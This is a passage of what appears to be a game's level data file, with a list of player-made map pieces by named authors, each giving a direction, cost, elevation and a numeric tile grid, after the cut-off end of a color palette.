0,0,0,0,0,Vector(224,223,214),Vector(163,151,100),Vector(112,94,35),Vector(94,79,25),Vector(83,68,20),Vector(145,138,132),2,Vector(171,171,171),Vector(178,178,178),0,Vector(251,251,251),Vector(250,233,232),Vector(249,201,177),Vector(249,224,191),0,0,0,0,0,Vector(250,245,226),Vector(255,254,218),Vector(255,255,232),Vector(192,190,186),Vector(128,114,77),Vector(86,63,6),Vector(153,145,139),2,Vector(216,216,216),0,0,0,0,Vector(249,236,236),Vector(249,218,199),Vector(248,228,194),Vector(247,241,209),Vector(249,246,218),Vector(249,245,216),Vector(248,243,208),Vector(248,241,207),Vector(248,244,228),0,0,Vector(228,229,229),Vector(146,136,118),Vector(191,182,172),Vector(159,159,159),0,0,0,0,0,0,0,Vector(235,228,223),Vector(239,229,215),Vector(242,234,212),Vector(241,233,213),Vector(241,236,221),Vector(242,238,234),0,0,0,0,0,Vector(216,211,209)]});
maps.push({name="C",author="Hichatu",id="#1672251142",direction="forward",cost=149,elevation=0,map=[0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,5,100,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0]});
maps.push({name="U",author="Hichatu",id="#1672251162",direction="forward",cost=149,elevation=0,map=[0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,100,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="N",author="Hichatu",id="#1672251179",direction="forward",cost=161,elevation=0,map=[0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,100,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0]});
maps.push({name="T",author="Hichatu",id="#1672251197",direction="forward",cost=133,elevation=0,map=[0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,100,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,93,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="FINALE4SURE",author="GandalfThePimp",id="#1672252163",direction="left",cost=145,elevation=0,map=[5,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,45,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,125,45,45,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,45,45,45,45,45,5,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,45,45,45,5,5,5,125,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,45,45,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,45,45,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,45,45,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,45,45,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,45,45,45,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,5,45,45,45,45,125,5,0,0,0,0,0,0,0,0,0,0,0,5,5,45,45,45,45,5,5,5,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,0,5,5,0,0,0,0,0,0,2,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,2,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Jump Around",author="GandalfThePimp",id="#1672253938",direction="left",cost=219,elevation=1,map=[0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,1,5,5,5,5,5,1,5,5,6,6,6,0,0,0,0,0,0,0,0,1,0,5,5,26,26,1,5,5,6,6,6,0,0,0,1,1,1,1,1,1,0,5,5,26,26,1,1,1,1,6,6,0,0,6,6,6,6,0,0,0,0,0,0,0,0,0,0,0,1,6,6,0,0,2,66,66,6,44,93,0,0,38,38,0,28,28,0,0,1,7,7,0,0,2,66,66,6,44,94,0,0,38,38,0,28,28,0,0,1,7,7,0,0,6,6,6,1,0,0,0,0,0,0,0,0,0,0,0,1,7,7,0,0,0,14,14,1,44,44,40,40,0,36,36,0,30,30,0,1,7,7,0,0,0,13,13,1,44,44,40,40,0,36,36,0,30,30,0,1,7,7,0,0,0,13,13,1,0,0,0,0,0,0,0,0,0,0,0,1,8,8,0,0,0,13,13,1,0,42,42,0,0,0,34,34,0,32,32,1,8,8,0,0,0,13,13,1,0,42,42,0,0,0,34,34,0,32,32,1,8,8,0,0,0,12,12,1,1,1,1,1,1,1,1,1,1,1,1,1,9,9,0,0,0,12,12,12,12,12,11,11,11,11,10,10,10,128,9,9,9,9,0,0,0,12,12,12,12,12,11,11,11,11,10,10,10,10,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="rtv guy fan",author="GandalfThePimp",id="#1672254971",direction="left",cost=270,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,14,14,2,2,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,89,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,89,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,185,7,7,185,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,185,65,65,185,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,185,65,65,185,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,185,65,65,185,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,185,65,65,185,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,185,65,65,185,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,185,65,65,185,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,185,65,65,185,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,185,7,7,185,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,86,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,90,14,14,14,14,0,0,14,14,3,7,7,7,7,7,7,7,3,14,89,14,85,14,90,14,0,0,14,85,185,185,185,185,185,185,185,185,185,14,90,14,14,14,14,14,0,0,2,14,7,65,65,65,65,65,65,65,7,14,14,14,14,90,14,14,0,0,2,14,7,65,65,65,65,65,65,65,7,14,86,14,86,14,89,14,0,0,14,14,185,185,185,185,185,185,185,185,185,90,14,14,90,14,14,14,0,0,14,89,3,7,7,7,7,7,7,7,3,14,14,14,14,14,14,14,0,0]});
maps.push({name="Over and Under",author="sivi",id="#1672260802",direction="forward",cost=432,elevation=0,map=[1,1,1,1,1,1,1,1,105,2,2,105,1,1,1,1,1,1,1,1,1,90,107,106,105,90,1,93,5,5,5,5,94,1,90,105,106,107,90,1,1,107,107,106,105,105,199,0,0,6,6,0,0,199,105,105,106,107,107,1,1,107,107,1,105,105,199,0,0,7,7,0,0,199,105,105,1,107,107,1,1,108,108,1,90,105,199,0,0,8,8,0,0,199,105,90,1,108,108,1,1,109,109,1,105,105,199,0,0,9,9,0,0,199,105,105,1,109,109,1,1,110,110,1,105,105,1,77,1,10,10,1,77,1,105,105,1,110,110,1,1,111,111,11,45,45,111,75,111,11,11,111,75,111,45,45,11,111,111,1,1,90,111,11,45,90,111,75,111,11,11,111,75,111,90,45,11,111,90,1,1,1,1,1,105,9998,1,1,1,1,1,1,1,1,9998,105,1,1,1,1,1,1,1,1,105,9998,1,1,1,1,1,1,1,1,9998,105,1,1,1,1,1,90,111,11,45,90,111,75,111,11,11,111,75,111,90,45,11,111,90,1,1,111,111,11,45,45,111,75,111,11,11,111,75,111,45,45,11,111,111,1,1,110,110,1,105,105,1,77,1,10,10,1,77,1,105,105,1,110,110,1,1,109,109,1,105,105,199,0,0,9,9,0,0,199,105,105,1,109,109,1,1,108,108,1,90,105,199,0,0,8,8,0,0,199,105,90,1,108,108,1,1,107,107,1,105,105,199,0,0,7,7,0,0,199,105,105,1,107,107,1,1,107,107,106,105,105,199,0,154,6,6,153,0,199,105,105,106,107,107,1,1,90,107,106,105,90,1,88,5,5,5,5,88,1,90,105,106,107,90,1,1,1,1,1,1,1,1,1,105,2,2,105,1,1,1,1,1,1,1,1]});
maps.push({name="fishing for s2",author="Fara",id="#1672264443",direction="forward",cost=188,elevation=1,map=[0,0,0,0,0,0,0,0,0,0,0,0,25,0,5,2,2,142,0,0,0,0,0,0,0,0,0,0,0,0,0,25,0,5,5,5,147,147,142,0,0,0,0,0,0,0,0,0,0,0,10,10,5,5,5,142,147,147,142,0,0,0,0,0,0,0,0,0,0,25,0,5,5,5,0,0,142,142,0,0,0,0,0,0,0,0,0,0,25,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,0,5,5,5,0,0,0,0,0,0,0,6,6,6,6,0,0,0,25,0,5,5,5,0,0,0,0,0,0,0,0,66,66,66,66,0,0,25,0,5,5,5,0,0,0,0,0,0,0,0,0,66,66,66,66,0,25,0,5,5,5,0,0,0,0,0,0,0,0,0,0,66,66,66,66,25,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,66,66,16,66,10,10,5,5,0,9998,9998,9998,9998,9998,9998,9998,9998,9998,9998,0,66,66,66,16,0,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,16,16,66,0,0,0,0,0,9998,9998,9998,9998,9998,9998,9998,9998,9998,9998,0,66,66,66,66,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,66,66,66,66,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,66,66,66,66,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,6,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,2,2,6]});
maps.push({name="eternalGrove I guess",author="Fara",id="#1672268214",direction="right",cost=322,elevation=17,map=[1,1,1,1,1,185,2,2,185,1,1,1,1,1,1,1,0,43,94,93,16,16,16,16,16,185,185,185,185,16,16,16,16,16,16,16,0,43,43,43,16,16,16,16,16,185,185,185,185,16,16,16,16,16,16,16,0,42,42,2,16,16,16,16,16,185,185,185,185,16,16,16,16,16,16,16,0,42,42,2,15,15,15,5,5,5,5,5,5,5,5,5,5,16,16,16,0,41,41,41,14,14,14,5,5,5,5,5,5,5,5,5,35,16,16,16,0,41,41,41,13,13,13,27,5,5,5,5,5,5,5,5,34,16,16,16,0,40,40,40,12,12,12,29,5,5,5,5,5,5,5,5,33,16,16,16,0,40,40,0,11,11,11,31,5,5,5,5,5,5,5,5,32,16,16,16,24,96,96,24,10,10,10,5,5,5,5,5,5,5,5,5,31,16,16,16,0,40,40,40,10,10,10,5,5,5,5,5,5,5,5,5,30,16,16,16,0,40,40,40,10,10,10,5,5,5,5,5,5,5,5,5,29,16,16,16,17,38,39,39,10,10,10,9,8,7,6,5,5,5,5,5,28,16,16,16,17,38,39,39,10,10,10,9,8,7,6,5,5,5,5,5,27,16,16,16,17,38,39,39,10,10,10,9,8,7,6,5,5,5,5,5,26,16,16,16,17,38,39,0,0,0,0,0,0,0,0,0,0,0,0,0,42,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,93,97,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,39,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,41,16,0,40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="wiggle among pillars",author="Fara",id="#1672268238",direction="right",cost=255,elevation=17,map=[0,0,25,2,2,25,0,0,29,29,29,30,0,0,0,0,0,0,0,0,0,25,25,25,25,25,25,29,29,29,30,30,30,0,0,0,0,0,0,0,26,26,25,1,1,25,29,29,29,1,1,30,30,30,0,0,0,0,0,0,26,26,1,1,1,1,28,28,1,1,1,1,30,30,0,0,0,0,0,0,26,26,1,1,1,1,28,28,1,1,1,1,30,30,0,0,0,0,0,0,26,26,26,1,1,28,28,28,28,1,1,31,31,31,0,0,0,0,0,0,0,27,27,27,27,27,28,28,32,32,31,31,31,0,36,36,36,36,0,0,0,0,27,27,27,27,0,32,32,32,31,31,31,35,35,36,36,36,37,0,0,0,0,0,0,0,32,32,32,1,1,31,35,35,35,1,1,36,37,37,0,0,0,0,0,0,32,32,1,1,1,1,35,35,1,1,1,1,37,37,0,0,0,0,0,0,32,32,1,1,1,1,35,35,1,1,1,1,37,37,0,0,0,0,0,0,33,33,33,1,1,34,34,34,34,1,1,38,37,37,0,0,0,0,0,0,0,33,33,33,34,34,34,34,38,38,38,38,38,0,0,0,0,0,35,35,0,0,33,33,34,34,0,38,38,38,38,38,42,0,0,36,36,1,1,35,35,0,0,0,0,0,39,38,38,1,1,42,42,42,0,0,1,1,1,1,35,0,0,0,0,0,39,39,1,1,1,1,42,2,0,38,1,1,1,1,0,0,0,0,0,0,39,39,1,1,1,1,42,2,0,38,93,1,1,36,0,0,0,0,0,0,39,39,40,1,1,41,42,42,0,94,38,38,0,36,0,0,0,0,0,0,0,40,40,40,40,41,41,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,40,40,41,0,0]});
maps.push({name="Winding Up",author="ZpLit",id="#1672273046",direction="forward",cost=378,elevation=10,map=[0,5,2,2,5,0,0,0,24,24,24,24,24,24,24,24,24,24,24,0,0,6,9998,9998,6,0,0,24,55,55,55,55,55,91,55,55,55,55,55,24,0,7,5,5,7,0,0,24,55,115,115,90,115,91,115,115,115,115,55,24,0,8,5,5,8,0,0,24,55,115,115,115,115,91,115,115,115,115,55,24,0,9,5,5,9,0,0,24,55,115,115,55,55,91,55,55,115,90,55,24,0,10,91,91,10,0,0,1,54,114,114,54,1,24,24,55,115,115,55,24,14,11,45,45,11,14,0,116,53,113,113,53,116,0,24,55,115,115,55,24,14,45,105,105,45,14,0,115,52,112,112,52,115,0,24,55,115,115,55,24,14,45,105,105,45,14,0,114,51,111,111,51,114,0,24,55,90,115,55,24,14,45,105,105,90,14,0,113,50,110,110,50,113,0,24,55,115,115,55,24,14,45,105,105,45,14,0,112,49,109,109,49,112,0,24,55,115,115,90,24,14,45,105,105,45,14,0,111,48,108,108,48,111,0,24,55,115,115,55,24,14,45,105,105,45,14,0,110,47,107,107,47,110,0,24,90,115,115,55,24,14,45,105,90,45,14,0,109,46,106,106,46,109,0,24,55,115,115,55,24,14,45,105,105,45,1,14,1,45,105,105,45,1,0,24,55,115,90,55,24,14,45,105,105,45,45,91,45,45,105,105,45,14,0,24,55,115,115,55,24,14,45,105,105,105,105,91,105,105,90,105,45,14,0,24,91,1,1,91,24,14,45,90,105,105,105,91,105,105,105,105,45,14,0,24,9998,15,15,9998,24,14,45,45,45,45,45,91,45,45,45,45,45,14,0,24,15,15,15,15,24,0,14,14,14,14,14,14,14,14,14,14,14,0,0,24,15,2,2,15,24]});
maps.push({name="Round Is Over",author="ZpLit",id="#1672273770",direction="left",cost=200,elevation=5,map=[1,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,2,2,1,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,5,5,1,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,6,6,10,10,50,50,50,16,50,50,50,50,50,16,50,50,50,50,50,16,7,7,10,10,50,50,50,16,50,90,50,50,50,16,50,50,50,90,50,16,8,8,2,10,16,50,50,16,50,50,16,50,50,16,50,50,16,50,50,16,9,9,2,10,16,50,90,50,50,50,16,50,50,50,50,50,16,50,50,50,10,10,10,9998,93,9998,50,50,50,9998,93,9998,50,50,50,9998,93,9998,50,50,10,10,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Rounded Up",author="ZpLit",id="#1672278346",direction="left",cost=196,elevation=6,map=[0,0,11,45,2,2,45,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,45,46,46,45,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,45,46,46,45,11,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,45,46,46,45,17,17,17,17,17,17,17,0,0,0,0,0,0,51,51,51,45,46,46,45,51,51,51,51,51,51,51,17,0,0,0,0,0,2,52,52,46,46,46,46,52,52,52,52,52,52,51,17,0,0,0,0,0,2,52,52,46,46,46,46,52,52,52,52,52,52,51,17,0,0,0,0,0,51,51,51,45,46,46,45,51,51,51,51,52,52,51,17,0,0,0,0,0,17,17,17,45,46,46,45,1,17,1,9998,51,51,9998,17,0,0,0,0,0,0,0,11,45,46,46,45,1,93,1,9998,50,50,9998,16,0,0,0,0,0,0,0,11,45,46,46,45,1,1,1,9998,49,49,9998,15,0,0,0,0,0,0,0,11,45,46,46,9998,9998,9998,9998,9998,49,49,9998,14,0,0,0,0,0,0,0,11,45,46,46,46,46,47,48,49,49,49,9998,14,0,0,0,0,0,0,0,11,45,46,46,46,46,47,48,49,49,49,9998,14,0,0,0,0,0,0,0,11,45,45,45,9998,9998,9998,9998,9998,9998,9998,9998,14,0,0,0,0,0,0,0,0,11,11,11,11,11,12,13,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Smoothed Out",author="ZpLit",id="#1672280739",direction="right",cost=195,elevation=0,map=[0,0,0,0,0,0,11,45,2,2,45,11,11,11,11,11,11,11,11,11,0,0,0,0,0,0,11,45,46,46,45,11,45,45,45,45,45,45,45,45,0,0,0,0,0,0,11,45,46,46,45,11,45,46,46,46,46,46,46,2,0,0,0,0,0,0,11,45,46,46,45,11,45,46,90,46,46,46,46,2,0,0,0,0,0,0,11,45,46,46,45,11,45,46,46,45,45,45,45,45,0,0,0,0,0,0,11,45,46,46,45,11,45,46,46,45,11,11,11,11,0,0,0,0,0,0,11,45,46,46,45,11,45,46,46,45,11,0,0,0,0,0,0,0,0,0,11,45,46,46,45,11,45,46,46,45,11,0,0,0,0,0,0,0,0,0,11,45,46,46,45,11,45,46,46,45,11,0,0,0,0,0,0,0,0,0,11,45,46,46,45,11,45,46,46,45,11,0,0,0,0,0,0,0,0,0,11,45,46,46,45,11,45,46,46,45,11,0,0,0,0,0,0,0,0,0,11,45,46,46,45,45,45,46,46,45,11,0,0,0,0,0,0,0,0,0,11,45,46,90,46,46,46,90,46,45,11,0,0,0,0,0,0,0,0,0,11,45,46,46,46,46,46,46,46,45,11,0,0,0,0,0,0,0,0,0,11,45,45,45,45,45,45,45,45,45,11,0,0,0,0,0,0,0,0,0,0,11,11,11,11,11,11,11,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="What A View",author="ZpLit",id="#1672284304",direction="forward",cost=493,elevation=-19,map=[0,0,24,24,24,24,24,24,24,2,2,24,24,24,24,24,24,24,0,0,0,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,0,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,9998,1,199,199,199,1,199,199,1,199,199,199,1,9998,24,24,24,24,24,24,1,90,5,5,5,5,5,5,90,5,5,5,90,1,24,24,24,24,24,24,199,5,5,5,5,5,90,5,5,5,5,5,5,199,24,24,24,24,24,24,199,5,90,5,90,5,5,5,5,90,5,90,5,199,24,24,24,24,24,24,1,5,5,5,5,5,5,90,5,5,5,5,5,1,24,24,24,24,24,24,199,5,90,66,66,66,66,66,66,66,66,90,5,199,24,24,24,24,24,24,199,5,66,66,66,66,66,66,66,66,66,66,5,199,24,24,24,24,24,24,1,66,66,5,5,5,5,5,5,5,5,66,66,1,24,24,24,24,24,5,66,66,66,5,14,12,16,14,16,14,5,66,66,66,5,24,24,24,5,5,66,66,66,5,16,22,24,22,20,16,5,66,66,66,5,5,24,5,5,5,66,66,66,5,12,24,1,1,22,14,5,66,66,66,5,5,5,5,5,5,66,66,66,5,14,22,1,1,24,16,5,66,66,66,5,5,5,5,5,5,66,66,66,5,16,20,24,22,20,12,5,66,66,66,5,5,5,5,5,5,66,66,66,5,12,14,16,16,12,14,5,66,66,66,5,5,5,5,5,5,68,68,68,5,5,5,5,5,5,5,5,68,68,68,5,5,5,5,5,5,68,68,68,5,5,5,5,5,5,5,5,68,68,68,5,5,5,0,0,0,67,67,67,0,0,88,2,2,88,0,0,67,67,67,0,0,0]});
maps.push({name="Path peril",author="Luffaren",id="#1672296803",direction="forward",cost=156,elevation=4,map=[0,0,0,0,0,0,0,5,5,2,2,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,94,5,5,5,5,94,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,6,6,6,6,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,7,7,7,7,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,8,8,8,8,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,9,9,9,9,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,10,10,10,10,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,11,11,11,11,5,0,0,0,0,0,0,0,145,24,148,0,0,0,0,9998,12,12,12,12,9998,0,0,0,0,0,24,145,145,24,0,0,0,0,0,67,12,12,12,12,67,0,0,0,0,148,24,145,145,24,148,0,0,0,0,9998,12,12,12,12,9998,0,0,0,0,0,24,145,0,0,0,0,0,0,0,5,11,11,11,11,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,10,10,10,10,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,9,9,9,9,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,9,9,89,9,5,0,0,0,0,0,0,0,0,0,0,0,141,9,5,5,9,9,9,9,5,5,9,141,0,0,0,0,0,0,0,0,5,5,93,5,9,89,9,9,5,93,5,5,0,0,0,0,0,0,0,0,0,0,0,5,9,9,9,9,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,9,2,2,9,5,0,0,0,0,0,0,0]});
